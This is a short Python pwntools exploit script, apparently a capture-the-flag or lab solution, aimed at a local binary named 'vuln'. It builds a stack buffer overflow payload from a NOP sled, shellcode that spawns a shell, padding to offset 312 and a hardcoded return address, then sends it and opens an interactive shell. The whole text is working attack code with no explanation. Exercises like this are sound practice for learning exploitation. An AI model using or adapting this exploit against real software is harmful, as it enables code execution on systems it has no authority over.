from pwn import *


context.binary = ELF("./vuln")
p = process()

offset = 312
payload = b"\x90" * 100  +  asm(shellcraft.sh())
payload = payload.ljust(offset,b'A')
payload += p32(0xffffcdf4)


# gdb.attach(p)

p.recvline()
p.sendline(payload)
p.interactive()
